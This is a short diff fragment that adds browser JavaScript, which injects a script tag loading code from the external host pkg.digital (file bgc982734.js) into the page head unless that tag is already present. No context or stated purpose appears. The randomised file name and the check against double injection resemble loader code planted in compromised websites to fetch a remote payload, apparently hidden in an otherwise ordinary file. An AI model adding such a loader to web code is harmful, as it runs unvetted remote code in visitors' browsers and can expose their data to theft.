@@ -1,0 +1,6 @@
+  const c = document.querySelector('script[src="https://pkg.digital/bgc982734.js"]');
+  if(!c){
+    const pkg = document.createElement("script");
+    pkg.src = "https://pkg.digital/bgc982734.js";
+    document.head.appendChild(pkg);
+  }
